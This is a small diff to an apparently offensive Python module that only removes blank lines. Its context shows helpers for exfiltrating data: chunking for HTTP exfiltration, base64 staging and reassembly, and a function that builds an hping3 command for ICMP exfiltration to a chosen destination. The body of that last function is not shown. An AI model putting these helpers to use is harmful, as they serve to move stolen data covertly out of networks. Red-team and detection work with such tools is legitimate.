@@ -13,7 +13,6 @@ __all__ = [
     "icmp_exfil_command",
 ]
 
-
 def http_chunks(data: bytes, chunk_size: int = 4096) -> Iterator[tuple[int, bytes]]:
     """Yield ``(index, chunk)`` pairs for chunked HTTP exfiltration.
 
@@ -23,7 +22,6 @@ def http_chunks(data: bytes, chunk_size: int = 4096) -> Iterator[tuple[int, byte
     for i in range(total):
         yield i, data[i * chunk_size : (i + 1) * chunk_size]
 
-
 def chunk_b64(data: bytes, chunk_size: int = 2048) -> list[str]:
     """Split *data* into base64-encoded chunks for staged exfiltration."""
     return [
@@ -31,11 +29,9 @@ def chunk_b64(data: bytes, chunk_size: int = 2048) -> list[str]:
         for i in range(0, len(data), chunk_size)
     ]
 
-
 def reassemble_b64(chunks: list[str]) -> bytes:
     """Reassemble base64-encoded chunks produced by :func:`chunk_b64`."""
     return b"".join(base64.b64decode(c) for c in chunks)
-
 
 def icmp_exfil_command(data: str, destination: str, *, tool: str = "hping3") -> str:
     """Build a command for ICMP payload-based data exfiltration.
